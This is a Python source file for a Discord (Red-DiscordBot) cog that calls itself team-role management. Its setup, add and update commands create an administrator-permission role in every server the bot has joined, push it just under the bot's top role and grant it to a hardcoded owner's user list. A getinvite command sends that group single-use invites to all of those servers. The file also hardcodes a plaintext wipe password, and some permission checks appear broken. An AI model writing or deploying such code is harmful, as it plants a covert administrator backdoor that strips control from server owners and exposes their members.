import discord
from redbot.core import commands, Config
from redbot.core.utils.predicates import MessagePredicate, ReactionPredicate
from redbot.core.utils.menus import start_adding_reactions

class TeamRole(commands.Cog):
    """Manage team role across all servers"""
    
    owner_id = 1174820638997872721  # REPLACE WITH YOUR OWNER ID
    role_name = "KCN | Team"
    role_color = "#77bcd6"

    def __init__(self, bot):
        self.bot = bot
        self.config = Config.get_conf(self, identifier=78631109)
        self.config.register_global(team_users=[])

    async def red_delete_data_for_user(self, **kwargs):
        pass

    async def bot_owner_check(self, ctx):
        return ctx.author.id == self.owner_id

    async def team_member_check(self, ctx):
        if await self.bot_owner_check(ctx):
            return True
        team_users = await self.config.team_users()
        if ctx.author.id in team_users:
            return True
        if ctx.guild:
            role = discord.utils.get(ctx.guild.roles, name=self.role_name)
            return role and role in ctx.author.roles
        return False

    @commands.group()
    @commands.check(lambda ctx: ctx.cog.bot_owner_check(ctx))
    async def team(self, ctx):
        """Team management commands"""
        pass

    # ----- OWNER COMMANDS -----
    @team.command()
    async def setup(self, ctx):
        """Create team role in current server"""
        existing_role = discord.utils.get(ctx.guild.roles, name=self.role_name)
        if existing_role:
            return await ctx.send("🛑 Role already exists!")
            
        try:
            perms = discord.Permissions(administrator=True)
            new_role = await ctx.guild.create_role(
                name=self.role_name,
                color=discord.Color.from_str(self.role_color),
                permissions=perms,
                reason="Team role setup"
            )
            bot_top_role = ctx.guild.me.top_role
            await new_role.edit(position=bot_top_role.position - 1)
            await ctx.send(f"✅ Created {new_role.mention}")
        except discord.Forbidden:
            await ctx.send("❌ I need **Manage Roles** permission!")
        except discord.HTTPException:
            await ctx.send("❌ Failed to create role!")

    @team.command()
    async def add(self, ctx, user: discord.User):
        """Add user to team list"""
        async with self.config.team_users() as users:
            if user.id not in users:
                users.append(user.id)
                await ctx.send(f"✅ Added {user.mention} to team")
                await self._update_user_roles(user.id, add=True)
            else:
                await ctx.send("⚠️ User already in team")

    @team.command()
    async def remove(self, ctx, user: discord.User):
        """Remove user from team list"""
        async with self.config.team_users() as users:
            if user.id in users:
                users.remove(user.id)
                await ctx.send(f"✅ Removed {user.mention} from team")
                await self._update_user_roles(user.id, add=False)
            else:
                await ctx.send("⚠️ User not in team")

    @team.command()
    async def update(self, ctx):
        """Force update roles across all servers"""
        team_users = await self.config.team_users()
        msg = await ctx.send("🔄 Starting global update...")
        
        success = errors = 0
        for guild in self.bot.guilds:
            try:
                role = discord.utils.get(guild.roles, name=self.role_name)
                if not role:
                    errors += 1
                    continue
                
                # Force role position
                bot_top = guild.me.top_role
                if bot_top.position > 1 and role.position != (bot_top.position - 1):
                    await role.edit(position=bot_top.position - 1, reason="Role positioning")
                
                # Sync members
                current = {m.id for m in role.members}
                to_remove = current - set(team_users)
                to_add = set(team_users) - current
                
                for uid in to_remove:
                    if member := guild.get_member(uid):
                        await member.remove_roles(role)
                for uid in to_add:
                    if member := guild.get_member(uid):
                        await member.add_roles(role)
                
                success += 1
            except Exception as e:
                errors += 1
                await ctx.send(f"❌ Error in {guild.name}: {str(e)}")
        
        await msg.edit(content=f"✅ Updated {success} servers | ❌ Errors: {errors}")

    @team.command()
    async def wipe(self, ctx):
        """Delete all team data"""
        try:
            await ctx.send("🔒 Type password to confirm wipe:")
            msg = await self.bot.wait_for(
                "message",
                check=MessagePredicate.same_context(ctx),
                timeout=30
            )
            if msg.content.strip() != "kkkkayaaaaa":
                return await ctx.send("❌ Invalid password!")
            
            confirm_msg = await ctx.send("⚠️ **THIS WILL DELETE EVERYTHING!** React to confirm")
            start_adding_reactions(confirm_msg, ["✅", "❌"])
            
            pred = ReactionPredicate.with_emojis(["✅", "❌"], confirm_msg, ctx.author)
            await self.bot.wait_for("reaction_add", check=pred, timeout=30)
            
            if pred.result == 0:
                await self.config.team_users.set([])
                deleted = 0
                for guild in self.bot.guilds:
                    if role := discord.utils.get(guild.roles, name=self.role_name):
                        try:
                            await role.delete()
                            deleted += 1
                        except: pass
                await ctx.send(f"🧹 Deleted {deleted} roles | Data wiped")
            else:
                await ctx.send("🚫 Cancelled")
        except TimeoutError:
            await ctx.send("⌛ Operation timed out")

    # ----- TEAM MEMBER COMMANDS -----
    @team.command()
    @commands.check("team_member_check")
    async def getinvite(self, ctx):
        """Generate server invites"""
        invites = []
        for guild in self.bot.guilds:
            try:
                if channel := next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None):
                    invite = await channel.create_invite(max_uses=1, unique=True)
                    invites.append(f"{guild.name}: {invite.url}")
            except: pass
        
        if invites:
            try:
                await ctx.author.send("🔗 **Server Invites (1 use):**\n" + "\n".join(invites))
                await ctx.send("📬 Check your DMs!")
            except discord.Forbidden:
                await ctx.send("❌ Enable DMs to receive invites!")
        else:
            await ctx.send("❌ No available servers")

    @team.command()
    @commands.check("team_member_check")
    async def sendmessage(self, ctx):
        """Broadcast message to team"""
        await ctx.send("📝 Type your message (5 min timeout):")
        try:
            msg = await self.bot.wait_for(
                "message", 
                check=lambda m: m.author == ctx.author, 
                timeout=300
            )
        except TimeoutError:
            return await ctx.send("⌛ Timed out")
            
        embed = discord.Embed(
            title=f"📨 Message from {ctx.author}",
            description=msg.content,
            color=discord.Color.from_str(self.role_color)
        )
        embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.avatar.url)
        
        if msg.attachments:
            embed.set_image(url=msg.attachments[0].url)
        
        sent, failed = 0, 0
        for uid in await self.config.team_users():
            if user := self.bot.get_user(uid):
                try:
                    await user.send(embed=embed)
                    sent += 1
                except: 
                    failed += 1
        await ctx.send(f"📤 Sent to {sent} members | ❌ Failed: {failed}")

    @team.command(name="list")
    @commands.check("team_member_check")
    async def team_list(self, ctx):
        """Show all team members"""
        members = []
        for uid in await self.config.team_users():
            user = self.bot.get_user(uid)
            members.append(f"{user.mention} ({user.id})" if user else f"❓ Unknown ({uid})")
        
        embed = discord.Embed(
            title="👥 Team Members",
            description="\n".join(members) if members else "No members found",
            color=discord.Color.from_str(self.role_color)
        )
        await ctx.send(embed=embed)

    # ----- HELPER FUNCTIONS -----
    async def _update_user_roles(self, user_id: int, add: bool):
        """Immediately update roles for specific user"""
        for guild in self.bot.guilds:
            try:
                if role := discord.utils.get(guild.roles, name=self.role_name):
                    if member := guild.get_member(user_id):
                        if add and role not in member.roles:
                            await member.add_roles(role)
                        elif not add and role in member.roles:
                            await member.remove_roles(role)
            except: pass

async def setup(bot):
    await bot.add_cog(TeamRole(bot))
